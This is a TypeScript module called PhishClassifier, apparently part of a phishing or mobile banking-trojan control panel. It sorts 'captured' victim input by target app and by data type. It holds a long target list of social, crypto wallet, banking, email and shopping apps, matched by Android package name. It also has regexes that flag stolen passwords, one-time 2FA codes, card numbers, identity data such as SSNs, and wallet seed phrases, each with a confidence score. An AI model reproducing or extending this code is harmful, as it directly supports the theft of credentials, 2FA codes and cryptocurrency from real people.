/**
 * PhishClassifier — identifies what was captured without being told.
 *
 * Given a package name and a raw field dump, it answers:
 *   - Which app is this? (WhatsApp, Binance, Chase...)
 *   - What category? (social / crypto / finance / email / commerce)
 *   - What got captured? (password, OTP, card, identity, seed phrase...)
 *   - How confident are we?
 *
 * Pure functions. No I/O. The inbox route feeds it, it returns truth.
 */

export interface ClassifiedCapture {
  appName: string;
  appCategory: 'social' | 'crypto' | 'finance' | 'email' | 'commerce' | 'unknown';
  captureType: 'password' | 'otp' | 'card' | 'identity' | 'seed' | 'session' | 'personal' | 'other';
  isPassword: boolean;
  isOtp: boolean;
  isCard: boolean;
  isIdentity: boolean;
  confidence: number;
}

interface AppSignature {
  match: RegExp;
  name: string;
  category: ClassifiedCapture['appCategory'];
}

const APP_SIGNATURES: AppSignature[] = [
  // Social
  { match: /whatsapp/i, name: 'WhatsApp', category: 'social' },
  { match: /facebook|fb\.katana|fb\.orca/i, name: 'Facebook', category: 'social' },
  { match: /instagram/i, name: 'Instagram', category: 'social' },
  { match: /tiktok|ugc\.trill|musically/i, name: 'TikTok', category: 'social' },
  { match: /twitter|\.x\./i, name: 'X (Twitter)', category: 'social' },
  { match: /snapchat/i, name: 'Snapchat', category: 'social' },
  { match: /discord/i, name: 'Discord', category: 'social' },
  { match: /tencent\.mm|wechat/i, name: 'WeChat', category: 'social' },
  { match: /xingin|xhs|rednote/i, name: 'RedNote', category: 'social' },
  { match: /vkontakte|vk\./i, name: 'VK', category: 'social' },
  { match: /viber/i, name: 'Viber', category: 'social' },
  { match: /weibo|sina/i, name: 'Weibo', category: 'social' },
  { match: /tencent\.mobileqq|qq/i, name: 'QQ', category: 'social' },
  { match: /pinterest/i, name: 'Pinterest', category: 'social' },
  { match: /telegram/i, name: 'Telegram', category: 'social' },
  { match: /signal/i, name: 'Signal', category: 'social' },
  { match: /line\./i, name: 'LINE', category: 'social' },
  { match: /kik\./i, name: 'Kik', category: 'social' },

  // Crypto
  { match: /binance/i, name: 'Binance', category: 'crypto' },
  { match: /coinbase/i, name: 'Coinbase', category: 'crypto' },
  { match: /metamask/i, name: 'MetaMask', category: 'crypto' },
  { match: /bitget|bitkeep/i, name: 'Bitget', category: 'crypto' },
  { match: /phantom/i, name: 'Phantom', category: 'crypto' },
  { match: /trustapp|trust.?wallet/i, name: 'Trust Wallet', category: 'crypto' },
  { match: /moonpay/i, name: 'MoonPay', category: 'crypto' },
  { match: /exodus/i, name: 'Exodus', category: 'crypto' },
  { match: /okx|okex|okcoin/i, name: 'OKX', category: 'crypto' },
  { match: /atomicwallet|atomic/i, name: 'Atomic Wallet', category: 'crypto' },
  { match: /blockchain/i, name: 'Blockchain.com', category: 'crypto' },
  { match: /coinomi/i, name: 'Coinomi', category: 'crypto' },
  { match: /crypto\.com|crypto\.exchange/i, name: 'Crypto.com', category: 'crypto' },
  { match: /edge|edgesecure/i, name: 'Edge Wallet', category: 'crypto' },
  { match: /jaxx|liberty/i, name: 'Jaxx Liberty', category: 'crypto' },
  { match: /huobi|htx/i, name: 'HTX', category: 'crypto' },
  { match: /bybit/i, name: 'Bybit', category: 'crypto' },
  { match: /dydx|opsdao/i, name: 'dYdX', category: 'crypto' },
  { match: /kraken|karken/i, name: 'Kraken', category: 'crypto' },
  { match: /kucoin/i, name: 'KuCoin', category: 'crypto' },
  { match: /gate\.io|gateio/i, name: 'Gate.io', category: 'crypto' },
  { match: /gemini/i, name: 'Gemini', category: 'crypto' },
  { match: /ledger/i, name: 'Ledger Live', category: 'crypto' },
  { match: /trezor/i, name: 'Trezor', category: 'crypto' },
  { match: /safepal/i, name: 'SafePal', category: 'crypto' },
  { match: /electrum/i, name: 'Electrum', category: 'crypto' },
  { match: /mycelium/i, name: 'Mycelium', category: 'crypto' },
  { match: /zengo/i, name: 'Zengo', category: 'crypto' },
  { match: /rainbow/i, name: 'Rainbow', category: 'crypto' },
  { match: /argent/i, name: 'Argent', category: 'crypto' },

  // Finance / Banking
  { match: /paypal/i, name: 'PayPal', category: 'finance' },
  { match: /chase/i, name: 'Chase', category: 'finance' },
  { match: /revolut/i, name: 'Revolut', category: 'finance' },
  { match: /boc|bankofchina/i, name: 'Bank of China', category: 'finance' },
  { match: /hsbc/i, name: 'HSBC', category: 'finance' },
  { match: /alfabank|alfa.?bank/i, name: 'Alfa Bank', category: 'finance' },
  { match: /airstar/i, name: 'AirStar Banking', category: 'finance' },
  { match: /alipay/i, name: 'Alipay', category: 'finance' },
  { match: /samsung\.spay|samsungpay|samsungwallet/i, name: 'Samsung Wallet', category: 'finance' },
  { match: /google.*wallet|walletnfcrel/i, name: 'Google Wallet', category: 'finance' },
  { match: /allybank|ally/i, name: 'Ally Bank', category: 'finance' },
  { match: /capitalone/i, name: 'Capital One', category: 'finance' },
  { match: /chime/i, name: 'Chime', category: 'finance' },
  { match: /creditone/i, name: 'Credit One', category: 'finance' },
  { match: /discover/i, name: 'Discover', category: 'finance' },
  { match: /wellsfargo|wells\.fargo/i, name: 'Wells Fargo', category: 'finance' },
  { match: /citibank|citi\./i, name: 'Citibank', category: 'finance' },
  { match: /boa|bankofamerica/i, name: 'Bank of America', category: 'finance' },
  { match: /zelle/i, name: 'Zelle', category: 'finance' },
  { match: /venmo/i, name: 'Venmo', category: 'finance' },
  { match: /cashapp|cash\.app/i, name: 'Cash App', category: 'finance' },
  { match: /wise|transferwise/i, name: 'Wise', category: 'finance' },
  { match: /westernunion|western\.union/i, name: 'Western Union', category: 'finance' },
  { match: /moneygram/i, name: 'MoneyGram', category: 'finance' },
  { match: /remitly/i, name: 'Remitly', category: 'finance' },
  { match: /worldremit/i, name: 'WorldRemit', category: 'finance' },
  { match: /payoneer/i, name: 'Payoneer', category: 'finance' },
  { match: /skrill/i, name: 'Skrill', category: 'finance' },
  { match: /neteller|netteler/i, name: 'Neteller', category: 'finance' },
  { match: /stripe/i, name: 'Stripe', category: 'finance' },
  { match: /square|cashapp/i, name: 'Square', category: 'finance' },
  { match: /n26/i, name: 'N26', category: 'finance' },
  { match: /monzo/i, name: 'Monzo', category: 'finance' },
  { match: /starling/i, name: 'Starling', category: 'finance' },
  { match: / mercury/i, name: 'Mercury', category: 'finance' },
  { match: /novo/i, name: 'Novo', category: 'finance' },
  { match: /varo/i, name: 'Varo', category: 'finance' },
  { match: /qonto/i, name: 'Qonto', category: 'finance' },
  { match: /lili/i, name: 'Lili', category: 'finance' },
  { match: /bluevine/i, name: 'Bluevine', category: 'finance' },
  { match: /greenfi/i, name: 'GreenFi', category: 'finance' },
  { match: /currencyfair/i, name: 'CurrencyFair', category: 'finance' },
  { match: /ofx/i, name: 'OFX', category: 'finance' },
  { match: /xe\./i, name: 'XE', category: 'finance' },
  { match: /simple/i, name: 'Simple', category: 'finance' },
  { match: /sofi/i, name: 'SoFi', category: 'finance' },
  { match: /marcus|goldman/i, name: 'Marcus by GS', category: 'finance' },
  { match: /onefinance|one\.finance/i, name: 'One Finance', category: 'finance' },
  { match: /moneylion/i, name: 'MoneyLion', category: 'finance' },
  { match: /sticpay/i, name: 'SticPay', category: 'finance' },
  { match: /transfergo/i, name: 'TransferGo', category: 'finance' },

  // Email
  { match: /gmail|google\.gm/i, name: 'Gmail', category: 'email' },
  { match: /outlook|hotmail|live\.com/i, name: 'Outlook', category: 'email' },
  { match: /yahoo/i, name: 'Yahoo Mail', category: 'email' },
  { match: /protonmail|proton\.me/i, name: 'ProtonMail', category: 'email' },

  // Commerce
  { match: /taobao/i, name: 'Taobao', category: 'commerce' },
  { match: /amazon/i, name: 'Amazon', category: 'commerce' },
  { match: /aliexpress/i, name: 'AliExpress', category: 'commerce' },
  { match: /ebay/i, name: 'eBay', category: 'commerce' },
  { match: /booking/i, name: 'Booking.com', category: 'commerce' },
];

// Field-name heuristics
const PASSWORD_FIELDS = /pass|pwd|pin(?!k)|secret|credential|auth|login|signin|sign_in/i;
const OTP_FIELDS = /otp|code|token|verify|verification|2fa|mfa|sms|authenticat/i;
const CARD_FIELDS = /card|cc|cvv|cvc|expir|exp_|mm_?yy|yy_?mm/i;
const IDENTITY_FIELDS = /name|dob|birth|ssn|national|id_?num|document|passport|driver|address|phone|email|maiden|occupation|income/i;
const SEED_FIELDS = /seed|phrase|mnemonic|recovery|backup|private.?key/i;
const USERNAME_FIELDS = /user|login|email|mail|handle|account/i;

export function classifyCapture(packageName: string, fieldName: string, fieldValue: string, formData?: string): ClassifiedCapture {
  const pkg = packageName || '';
  const field = (fieldName || '').toLowerCase();
  const value = (fieldValue || '').toLowerCase();
  const blob = `${field} ${value} ${(formData || '').toLowerCase()}`;

  // --- App identification ---
  let appName = 'Unknown App';
  let appCategory: ClassifiedCapture['appCategory'] = 'unknown';
  let appConfidence = 0;

  for (const sig of APP_SIGNATURES) {
    if (sig.match.test(pkg)) {
      appName = sig.name;
      appCategory = sig.category;
      appConfidence = 95;
      break;
    }
  }
  if (appConfidence === 0 && pkg) {
    // Derive a display name from the package tail
    const tail = pkg.split('.').pop() || pkg;
    appName = tail.charAt(0).toUpperCase() + tail.slice(1).replace(/([A-Z])/g, ' $1');
    appConfidence = 40;
  }

  // --- Capture type ---
  let captureType: ClassifiedCapture['captureType'] = 'other';
  let typeConfidence = 50;

  if (SEED_FIELDS.test(blob)) {
    captureType = 'seed';
    typeConfidence = 92;
  } else if (PASSWORD_FIELDS.test(field)) {
    captureType = 'password';
    typeConfidence = 90;
  } else if (OTP_FIELDS.test(field) && !PASSWORD_FIELDS.test(field)) {
    captureType = 'otp';
    typeConfidence = 85;
  } else if (CARD_FIELDS.test(field)) {
    captureType = 'card';
    typeConfidence = 88;
  } else if (IDENTITY_FIELDS.test(field)) {
    captureType = 'identity';
    typeConfidence = 80;
  } else if (USERNAME_FIELDS.test(field)) {
    captureType = 'session';
    typeConfidence = 65;
  }

  // Value-shape boosts
  if (/^\d{6}$/.test(value) && captureType !== 'otp') {
    captureType = 'otp';
    typeConfidence = Math.max(typeConfidence, 82);
  }
  if (/^\d{15,16}$/.test(value.replace(/\s/g, '')) && captureType !== 'card') {
    captureType = 'card';
    typeConfidence = Math.max(typeConfidence, 90);
  }
  if (/^(0[1-9]|1[0-2])\/?\d{2,4}$/.test(value) && captureType === 'other') {
    captureType = 'card';
    typeConfidence = 75;
  }

  const confidence = Math.round((appConfidence * 0.45) + (typeConfidence * 0.55));

  return {
    appName,
    appCategory,
    captureType,
    isPassword: captureType === 'password',
    isOtp: captureType === 'otp',
    isCard: captureType === 'card',
    isIdentity: captureType === 'identity' || captureType === 'seed',
    confidence,
  };
}

/** Extract every field from a formData JSON string and classify each. */
export function classifyForm(packageName: string, formData: string): Array<{ field: string; value: string; classification: ClassifiedCapture }> {
  const results: Array<{ field: string; value: string; classification: ClassifiedCapture }> = [];
  try {
    const obj = JSON.parse(formData);
    for (const [field, value] of Object.entries(obj)) {
      const strVal = String(value ?? '');
      results.push({
        field,
        value: strVal,
        classification: classifyCapture(packageName, field, strVal, formData),
      });
    }
  } catch { /* malformed JSON — single-field fallback */ }
  return results;
}
